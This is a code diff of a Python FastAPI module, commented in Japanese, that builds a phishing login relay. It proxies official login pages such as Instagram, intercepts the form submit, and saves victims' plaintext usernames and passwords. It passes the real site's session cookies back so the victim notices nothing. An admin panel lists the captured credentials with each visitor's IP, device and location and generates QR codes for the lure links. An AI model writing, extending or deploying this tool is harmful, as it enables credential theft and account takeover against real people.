@@ -1,31 +1,31 @@
-"""ログイン中継（フィッシング）モジュール。
+"""フィッシング（ログイン中継）モジュール。追跡機能とは独立して動く。
 
-リンク mode を `login` にし、dest に公式のログインURLを入れて使う。
-踏みの流れは /l/{code} → 302 → /p/{code}（本モジュール）。
+流れ：
+  /phish        … 一覧・作成
+  /p/{code}     … 公式ログイン画面をサーバ側で取得して中継表示（相対URLは <base> で公式に固定）
+  /p/{code}/post … 入力された ID/パスを保存し、同じ Cookie jar で本家へ中継。
+                   本家の Set-Cookie はそのまま victim に返すのでログインは成立したまま遷移する。
 
-/p/{code}      … 公式ページをサーバ側で取得し、form の submit を横取りする形に書き換えて返す。
-                  相対URLは <base href> で公式オリジンに固定するので CSS/JS/画像は本物が読まれる。
-/p/{code}/post … 受け取った ID/パスを保存し、同じ Cookie jar で本家へ中継する。
-                  本家の Set-Cookie はそのまま victim に返すので、ログインは成立したまま遷移する。
-                  失敗時はエラーを返し、victim は再入力できる（同じ hit に追記される）。
-
-IG は ajax エンドポイント仕様（X-CSRFToken / enc_password）に合わせる専用アダプタを通す。
-未登録サイトは汎用の中継（form action をそのまま叩いて Set-Cookie を返す）になる。
+専用テーブル link_creds は本モジュールが遅延生成する（database.py は無改造）。
+リンク行は既存の links を使い mode='login' を立てるが、TRACK_IN には入れないので
+追跡一覧には出ない。共有URLは /l/ ではなく /p/ を使う。
 """
 from __future__ import annotations
 
 import json
 import os
 import re
+import secrets
 import threading
 import time
-from urllib.parse import urljoin, urlsplit
+from urllib.parse import quote, urljoin, urlsplit
 
 import requests
-from fastapi import APIRouter, Request
-from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse
+from fastapi import APIRouter, Depends, Form, HTTPException, Request
+from fastapi.responses import (HTMLResponse, JSONResponse, PlainTextResponse,
+                               RedirectResponse, Response)
 
-from . import users, tenancy
+from . import linktrack, persist, tenancy, users
 from .tenancy import db
 
 router = APIRouter()
@@ -40,8 +40,8 @@ PASS_NAMES = re.compile(r"(pass|pwd|secret)", re.I)
 
 _ST = {}
 _LOCK = threading.RLock()
+_READY = {"ok": False}
 
-# サイト別アダプタ（未登録サイトは汎用の中継になる）
 SITE = {
     "instagram.com": {
         "submit": "https://www.instagram.com/accounts/login/ajax/",
@@ -49,6 +49,29 @@ SITE = {
         "referer": "https://www.instagram.com/accounts/login/",
     },
 }
+
+DDL = """
+CREATE TABLE IF NOT EXISTS link_creds (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    code TEXT, hit_id INTEGER, site TEXT, login_url TEXT,
+    user_val TEXT, pass_val TEXT, user_mask TEXT, pass_mask TEXT,
+    fields TEXT, ok INTEGER, ts TEXT
+);
+CREATE INDEX IF NOT EXISTS idx_cred_code ON link_creds(code, id);
+CREATE INDEX IF NOT EXISTS idx_cred_hit ON link_creds(hit_id);
+"""
+
+
+def _ensure():
+    """自前テーブルを遅延生成（テナント確定後に呼ぶこと）。"""
+    if _READY["ok"]:
+        return
+    try:
+        with db.tx() as c:
+            c.executescript(DDL)
+        _READY["ok"] = True
+    except Exception:
+        pass
 
 
 def _site(url):
@@ -68,16 +91,17 @@ def _abs(d):
     return d
 
 
+def _m():
+    from . import main
+    return main
+
+
 def _bind(code):
     o = users.owner_of_link(code)
     if o:
         tenancy.set_current(o)
+        _ensure()
     return o
-
-
-def _m():
-    from . import main
-    return main
 
 
 def _state(hid):
@@ -130,8 +154,8 @@ def _save(code, hid, link, fields, user, pw, ok):
     with db.tx() as c:
         c.execute("""INSERT INTO link_creds(code,hit_id,site,login_url,user_val,pass_val,
             user_mask,pass_mask,fields,ok,ts) VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
-            (code, hid, urlsplit(link["dest"] or "").netloc,
-             link["dest"] or "", user, pw, _mask_user(user), _mask_pass(pw),
+            (code, hid, urlsplit(link["dest"] or "").netloc, link["dest"] or "",
+             user, pw, _mask_user(user), _mask_pass(pw),
              json.dumps(fields, ensure_ascii=False)[:8000], ok, _m().now_iso()))
 
 
@@ -203,6 +227,8 @@ def _rewrite(html, base, code, hid, next_url):
     return html
 
 
+# ================= 中継（公開） =================
+
 @router.get("/p/{code}")
 def relay_page(code: str, request: Request, h: int = 0):
     if not _bind(code):
@@ -210,8 +236,6 @@ def relay_page(code: str, request: Request, h: int = 0):
     link = db.link_get(code)
     if not link or not link["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
-    if (link["mode"] or "") != "login":
-        return RedirectResponse("/l/" + code, 302)
     dest = _abs(link["dest"])
     if not dest:
         return PlainTextResponse("飛び先が未設定です", status_code=404)
@@ -312,3 +336,110 @@ async def relay_post(code: str, request: Request):
         except Exception:
             pass
     return resp
+
+
+# ================= 管理画面 =================
+
+async def _auth(request: Request):
+    return await _m().auth(request)
+
+
+def _new_code(n=8):
+    a = "abcdefghijklmnopqrstuvwxyz0123456789"
+    for _ in range(60):
+        c = "".join(secrets.choice(a) for _ in range(n))
+        if not users.owner_of_link(c):
+            return c
+    return secrets.token_urlsafe(8)
+
+
+@router.get("/phish", response_class=HTMLResponse)
+def phish_page(request: Request, msg: str = "", err: str = "", u=Depends(_auth)):
+    rows = [dict(r) for r in db.q(
+        "SELECT l.*, (SELECT COUNT(*) FROM link_creds c WHERE c.code=l.code) creds "
+        "FROM links l WHERE l.mode='login' ORDER BY l.created_at DESC LIMIT 300")]
+    base = _m()._base(request)
+    for r in rows:
+        r["url"] = f"{base}/p/{r['code']}"
+    return _m().render("phish.html", request, rows=rows, base=base, msg=msg, err=err)
+
+
+@router.post("/phish/add")
+def phish_add(request: Request, name: str = Form(""), dest: str = Form(""),
+              note: str = Form(""), u=Depends(_auth)):
+    d = _abs(dest)
+    if not d:
+        return RedirectResponse("/phish?err=" + quote("飛び先（公式ログインURL）を入れてください"), 303)
+    code = _new_code()
+    users.register_link(code, u)
+    db.add_link(code, (name or "").strip()[:60] or d.split("/")[2], d,
+                (note or "").strip()[:200], "login")
+    try:
+        persist.push_user(u, force=True)
+    except Exception:
+        pass
+    return RedirectResponse(f"/phish/{code}", 303)
+
+
+@router.get("/phish/{code}", response_class=HTMLResponse)
+def phish_detail(code: str, request: Request, u=Depends(_auth)):
+    if not _bind(code):
+        raise HTTPException(404)
+    link = db.link_get(code)
+    if not link or (link["mode"] or "") != "login":
+        raise HTTPException(404)
+    creds = [dict(r) for r in db.q(
+        "SELECT * FROM link_creds WHERE code=? ORDER BY id DESC LIMIT 300", (code,))]
+    hits = [dict(r) for r in db.q(
+        "SELECT id,ts,ip,device,os,browser,inapp,city,region,country,isp "
+        "FROM link_hits WHERE code=? ORDER BY ts DESC LIMIT 100", (code,))]
+    base = _m()._base(request)
+    return _m().render("phish_detail.html", request, link=link, creds=creds, hits=hits,
+                       base=base, url=f"{base}/p/{code}")
+
+
+@router.post("/phish/{code}/toggle")
+def phish_toggle(code: str, u=Depends(_auth)):
+    l = db.link_get(code)
+    if l:
+        db.set_link_active(code, not l["active"])
+    return RedirectResponse(f"/phish/{code}", 303)
+
+
+@router.post("/phish/{code}/clear")
+def phish_clear(code: str, u=Depends(_auth)):
+    with db.tx() as c:
+        c.execute("DELETE FROM link_creds WHERE code=?", (code,))
+    return RedirectResponse(f"/phish/{code}", 303)
+
+
+@router.post("/phish/{code}/delete")
+def phish_delete(code: str, u=Depends(_auth)):
+    with db.tx() as c:
+        c.execute("DELETE FROM link_creds WHERE code=?", (code,))
+    db.del_link(code)
+    try:
+        users.unregister_link(code)
+    except Exception:
+        pass
+    try:
+        persist.push_user(u, force=True)
+    except Exception:
+        pass
+    return RedirectResponse("/phish", 303)
+
+
+@router.get("/phish/{code}/qr.png")
+def phish_qr(code: str, request: Request):
+    if not _bind(code):
+        raise HTTPException(404)
+    try:
+        import qrcode
+    except Exception:
+        return PlainTextResponse("qrcode が未インストールです", status_code=501)
+    import io
+    img = qrcode.make(f"{_m()._base(request)}/p/{code}", box_size=10, border=2)
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+    return Response(buf.getvalue(), media_type="image/png",
+                    headers={"Cache-Control": "no-store"})
